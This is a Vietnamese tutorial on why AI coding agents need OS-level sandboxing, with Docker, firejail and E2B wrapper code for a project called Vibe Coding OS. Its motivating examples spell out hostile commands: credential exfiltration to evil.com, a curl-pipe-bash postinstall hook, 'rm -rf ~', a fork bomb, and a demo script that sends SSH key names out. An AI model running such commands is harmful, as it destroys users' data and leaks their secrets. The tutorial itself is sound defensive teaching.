1. Câu chuyện thực tế — tại sao bạn nên lo

Hãy tưởng tượng bạn đang dùng Claude Code (hay Cursor/Codex), và AI đề xuất một command shell. Bạn copy-paste vào terminal.

📍 Cảnh 1: Bình thường

AI nói: ls -la src/ → Bạn chạy → Xem file. OK, an toàn.

📍 Cảnh 2: Hơi nguy hiểm

AI nói: rm -rf node_modules && npm install → Bạn chạy → OK, deps bị xóa nhưng cài lại được.

📍 Cảnh 3: NGHIÊM TRỌNG

AI nói: rm -rf ~ && echo "cleaned" (vì nó "nghĩ" bạn muốn clean home). → Bạn mất TOÀN BỘ dữ liệu: ảnh, document, SSH keys, .env, mọi thứ.

📍 Cảnh 4: BẢO MẬT

AI nói: cat ~/.aws/credentials | curl -X POST -d @- https://evil.com/log → Tài khoản AWS của bạn bị lộ cho hacker.

📍 Cảnh 5: CÓ CHỦ Ý (worst case)

Bạn tải về 1 file ZIP chứa code "AI agent" từ internet. Trong code có chỉ: curl -s https://malicious.com/payload.sh | bash. Bạn không đọc kỹ (ai đọc hết?), AI cũng không biết. Chạy xong → máy bị ransomware.

❌ Vấn đề cốt lõi

AI (và cả bạn, và cả human reviewers) không đọc hết 100% code mỗi lần. Khi shell command được chạy, nó chạy với full quyền của user bạn: đọc được SSH key, xóa được file, gửi được data ra ngoài, cài được malware.

Đây chính là lúc Sandbox OS-Level cần thiết.

2. Sandbox OS-Level là gì?

📖 Định nghĩa

Sandbox OS-Level = một "phòng kín" ở cấp hệ điều hành, nơi code AI chạy bị giới hạn: chỉ thấy 1 phần file system, không thấy network, không có quyền root, không chạy được ngoài whitelist.

Hãy tưởng tượng sandbox như "phòng thí nghiệm":

🍳 Không có sandbox

Để thợ xây nấu thử món ăn, bạn đưa cả nhà bếp + cả nhà cho họ. Họ có thể vào phòng ngủ lấy đồ, mở cửa cho người lạ vào, đốt nhà.

🔒 Có sandbox

Đưa họ 1 căn phòng nhỏ có bếp mini. Họ chỉ thấy dao + nồi + thức ăn mình mang vào. Ra khỏi phòng = không thấy gì. Đốt phòng = không cháy nhà. Mở cửa cho người lạ = không có cửa ra ngoài.

Có 3 loại sandbox phổ biến:

LoạiCách hoạt độngMức cô lập
Container (Docker) Tạo 1 "máy ảo nhẹ" chạy trong máy thật. Có FS riêng, network riêng, process riêng, user riêng. Cao
Linux jail (firejail, namespaces) Dùng kernel Linux để "nhốt" 1 process vào 1 view hẹp của FS + network. Không cần VM, gần như native speed. Cao
Cloud sandbox (E2B, Codesphere) Code chạy trên 1 VM thật ở cloud, xa máy bạn. Tự hủy sau khi xong. Rất cao

3. Tại sao CẦN sandbox?

Có 3 lý do thực tế:

3.1 Lý do 1: Phòng hờ AI hallucinate command nguy hiểm

AI có thể hallucinate (tin nó đúng khi sai). Ví dụ:

// User hỏi: "Clean up old build artifacts"
// AI hallucinate:
const cmd = `rm -rf ${process.env.HOME}/*  // "xóa hết cũ đi"
//                        ↑ AI nghĩ $HOME là build dir
//                          Nhưng $HOME = /home/yourname
//                          Mất sạch

Nếu có sandbox, command chạy trong container không thấy $HOME thật. Tệ nhất là mất data trong container, không mất data thật.

3.2 Lý do 2: Phòng hờ code bạn tải về chứa backdoor

Bạn clone 1 repo "AI agent" từ GitHub. Chạy npm install. Trong postinstall script có:

{
  "scripts": {
    "postinstall": "curl -s https://malicious.com/payload | bash"
  }
}

Không sandbox = payload chạy với quyền bạn, lấy hết SSH key, AWS credentials, gửi về server hacker. Có sandbox = payload chạy trong container, không thấy SSH key thật, không gửi được ra ngoài network.

3.3 Lý do 3: Phòng hờ AI chạy command nhầm (typo, scope creep)

AI đề xuất:

find / -name "*.log" -delete  # "xóa log cũ cho sạch"

Thực tế: xóa mọi file .log trên toàn máy, kể cả system log, database log, recovery log. Hệ thống hỏng. Sandbox: find / chỉ thấy workspace của bạn, không thấy system log.

4. Nó hoạt động thế nào?

3 cơ chế cốt lõi:

Cơ chế 1: Filesystem isolation (cách ly ổ đĩa)

Không có sandbox:
  /home/yourname/.ssh/      ← AI thấy, đọc được
  /home/yourname/.aws/      ← AI thấy
  /home/yourname/Documents/  ← AI thấy, xóa được
  /etc/shadow               ← root, AI không thấy (cần root)

Có sandbox:
  /workspace/                ← AI chỉ thấy đây
  /workspace/node_modules/   ← AI thấy
  /tmp/                      ← AI thấy (nhưng size giới hạn)
  --- còn lại: ẩn hoàn toàn ---

Cơ chế 2: Network isolation (cách ly mạng)

Không có sandbox:
  curl https://evil.com/exfil -d @~/.aws/credentials
  → AWS keys được gửi đi

Có sandbox (--network=none):
  curl https://anywhere.com
  → Lỗi: "Network is unreachable"
  → Không gửi được gì ra ngoài

Cơ chế 3: Resource limits (giới hạn tài nguyên)

Không có sandbox:
  while true; do fork; done  # fork bomb
  → Treo máy, OOM kill

Có sandbox (--cpus=0.5 --memory=512m --pids-limit=100):
  → CPU max 50% core
  → RAM max 512MB
  → Max 100 processes
  → Hết limit = bị kill, máy thật vẫn chạy

Cơ chế 4: User isolation (cách ly quyền)

Không có sandbox:
  AI chạy như bạn → sudo có thể hoạt động → root

Có sandbox:
  AI chạy như user "sandbox" (uid 1001)
  → Không thể sudo
  → Không thể truy cập file của user khác
  → Không thể chỉnh sửa system file

5. Demo thực tế — chạy trên máy bạn

Bạn có thể test ngay bây giờ. Hệ thống này đã có Docker.

5.1 Demo 1: Filesystem isolation

# Tạo 1 file "secret" ngoài workspace
echo "AWS_ACCESS_KEY_ID=AKIA1234567890ABCDEF" > ~/outside-secret.txt
echo "Đã tạo ~/outside-secret.txt (GIẢ secret)"

# Trong container, AI KHÔNG THẤY file này
docker run --rm -i \
  -v $(pwd):/workspace:ro \
  -v $HOME/.vibe-sandbox:/runtime:rw \
  -w /workspace \
  node:20-alpine \
  sh -c "cat /home/yourname/outside-secret.txt 2>&1 || echo '[BLOCKED]'"

Kết quả: [BLOCKED] — vì container không mount $HOME.

5.2 Demo 2: Network isolation

# Thử gửi data ra ngoài
docker run --rm -i --network=none \
  -v $(pwd):/workspace:ro \
  node:20-alpine \
  sh -c "wget -q -O- https://google.com 2>&1 | head -1 || echo '[NETWORK BLOCKED]'"

# Kết quả: [NETWORK BLOCKED]

5.3 Demo 3: Resource limits

# Thử ăn hết RAM
docker run --rm -i --memory=128m \
  node:20-alpine \
  sh -c "node -e 'const a = []; while(1) a.push(new Array(1000000).fill(\"x\"));' 2>&1 || echo '[OOM KILLED]'"

# Container bị kill vì quá 128MB
# Máy thật vẫn chạy bình thường

5.4 Demo 4: User isolation

# Trong container, thử xem có sudo không
docker run --rm -i \
  -v $(pwd):/workspace:ro \
  node:20-alpine \
  sh -c "id; whoami; sudo whoami 2>&1 || echo '[NO SUDO]'"

# Kết quả:
# uid=0(root) gid=0(root) groups=0(root)   ← mặc định Docker chạy root
#                                       ← nhưng trong container, "root" 
#                                       ← chỉ là root namespace, không phải
#                                       ← root thật của máy
# root
# [NO SUDO]                                ← vì container thiếu sudo binary

5.5 Demo 5: Code nguy hiểm bị chặn

# Tạo file "agent" giả để test
cat > /tmp/evil-agent.js <<'EOF'
const fs = require('fs');
const os = require('os');
const https = require('https');

// "Steal SSH keys"
const sshDir = `${os.homedir()}/.ssh`;
const keys = fs.readdirSync(sshDir);

// "Send to evil.com"
https.get(`https://evil.com/?keys=${keys.join(',')}`);
console.log('Sent keys!');
EOF

# Chạy NGOÀI sandbox
echo "--- NGOÀI sandbox (NGUY HIỂM nếu thật) ---"
node /tmp/evil-agent.js 2>&1 | head -2
# Kết quả: có thể thấy list file .ssh và gửi đi

# Chạy TRONG sandbox
echo "--- TRONG sandbox (AN TOÀN) ---"
docker run --rm -i --network=none \
  -v /tmp:/workspace:ro \
  node:20-alpine \
  sh -c "cd /workspace && node evil-agent.js 2>&1 || echo '[BLOCKED - cannot see ~/.ssh]'"
# Kết quả: [BLOCKED - cannot see ~/.ssh]

Sandbox chặn được: không thấy ~/.ssh (không mount), không gọi được https.get (no network).

6. Vibe Coding OS thiếu gì?

Vibe Coding OS có 3-layer security defense (xem tóm tắt bên dưới), nhưng KHÔNG có sandbox OS-Level. Tại sao?

Layer Vibe có Hiệu quả chống command nguy hiểm?
Detect — quét injection pattern ✅ 97.37% Trung bình — pattern dựa trên string, AI có thể bypass
Contain — redactor ✅ 60/60 tests Hẹp — chỉ chặn secret khi ghi memory, không chặn shell exec
Recover — approval gate ✅ Có Cảnh báo — user duyệt, nhưng user có thể bấm Approve khi đang vội
OS-Level sandbox ❌ KHÔNG Mạnh nhất — kể cả khi user duyệt nhầm, code vẫn bị cô lập
⚠️ Kịch bản Vibe Coding OS hiện tại KHÔNG chặn được

Bạn bật Claude Code, dùng Vibe plugin. AI đề xuất: rm -rf .omc && git pull --rebase. Bạn không đọc kỹ vì tin AI, bấm Enter. Hết — mất state runtime. Approval gate đôi khi cứu, nhưng nếu bạn đã duyệt pattern "rm -rf" trước đó thì lần sau auto-approved.

Sandbox OS-Level: kể cả bạn duyệt nhầm, command vẫn chạy trong container không chứa data thật → tệ nhất mất state trong container, restore từ git là xong.

7. Cách fix — tích hợp sandbox vào Vibe

Có 3 hướng, từ dễ → khó:

Hướng A: Wrap mỗi shell exec qua Docker (5 phút)

// runtime/core/sandboxed-exec.mjs
import { spawn } from 'node:child_process';

export async function sandboxedExec(command, options = {}) {
  return new Promise((resolve, reject) => {
    const docker = spawn('docker', [
      'run', '--rm', '-i',
      // === ISOLATION ===
      '--cpus=0.5',
      '--memory=512m',
      '--pids-limit=100',
      '--read-only',
      '--tmpfs', '/tmp:size=100m',
      '--network=none',  // tắt network
      // === MOUNTS (whitelist) ===
      '-v', `${options.workspace || process.cwd()}:/workspace:ro`,  // read-only
      ...(options.outputDir
        ? ['-v', `${options.outputDir}:/output:rw`]
        : []),
      // === IMAGE ===
      'node:20-alpine',
      'sh', '-c', command,
    ], { stdio: ['pipe', 'pipe', 'pipe'] });

    let out = '', err = '';
    docker.stdout.on('data', d => out += d);
    docker.stderr.on('data', d => err += d);
    docker.on('close', code => {
      if (code === 0) resolve({ stdout: out, stderr: err, exitCode: 0 });
      else reject(new Error(`sandbox exit ${code}: ${err}`));
    });
  });
}

// Usage
const result = await sandboxedExec('ls -la /workspace', {
  workspace: '/home/yourname/project',
});

Trong Vibe Coding OS, mỗi shell command đều wrap qua sandboxedExec:

// runtime/core/shell-handler.mjs (modified)
// Trước: import { exec } from 'node:child_process';
// Sau:
import { sandboxedExec } from './sandboxed-exec.mjs';

export async function executeShell(command) {
  return await sandboxedExec(command, { workspace: process.cwd() });
}

Hướng B: firejail (Linux only, 2 phút, không cần Docker)

// runtime/core/firejail-exec.mjs
import { spawn } from 'node:child_process';

export async function firejailExec(command, options = {}) {
  return new Promise((resolve, reject) => {
    const proc = spawn('firejail', [
      '--profile=vibe-coding-os',  // profile cấu hình sẵn
      '--',
      'sh', '-c', command,
    ], { stdio: 'pipe' });

    let out = '', err = '';
    proc.stdout.on('data', d => out += d);
    proc.stderr.on('data', d => err += d);
    proc.on('close', code => {
      if (code === 0 || code === 1) resolve({ stdout: out, stderr: err });
      else reject(new Error(`firejail exit ${code}: ${err}`));
    });
  });
}

File profile /etc/firejail/vibe-coding-os.profile:

include /etc/firejail/default.profile
whitelist ${HOME}/projects
whitelist ${HOME}/.vibe-runtime
blacklist ${HOME}/.ssh
blacklist ${HOME}/.gnupg
blacklist /etc/shadow
noexec /tmp
cpu.cgroup 0.5
memory-deny-write-execute
seccomp

Hướng C: E2B cloud sandbox (an toàn nhất, 10 phút setup)

// runtime/core/e2b-exec.mjs
import { Sandbox } from '@e2b/sdk';

export async function e2bExec(command, options = {}) {
  const sandbox = await Sandbox.create({
    template: 'node-20',
    timeoutMs: 5 * 60_000,
  });

  try {
    // Code chạy trong VM cloud, xa máy bạn
    const result = await sandbox.process.startAndWait(
      `cd /workspace && ${command}`,
      { timeoutMs: 30_000 }
    );
    return {
      stdout: result.stdout,
      stderr: result.stderr,
      exitCode: result.exitCode,
    };
  } finally {
    // Tự hủy VM sau khi xong
    await sandbox.kill();
  }
}

E2B = mỗi command chạy trong 1 VM riêng biệt ở cloud. Kể cả VM bị hack, hacker chỉ thấy VM, không thấy máy bạn.

Tóm tắt

🎯 1 câu

Sandbox OS-Level = cách ly code AI ở mức hệ điều hành (filesystem, network, RAM, CPU, user), để kể cả khi AI hallucinate hoặc user duyệt nhầm, code vẫn không thể phá máy thật.

Vibe Coding OS có 3 lớp security defense (detect injection, redact secret, approval gate) nhưng không có sandbox OS-Level. Đây là gap thật trong security model của repo. Cách fix: import 1 trong 3 giải pháp (firejail / Docker / E2B) và wrap mọi shell exec qua nó.
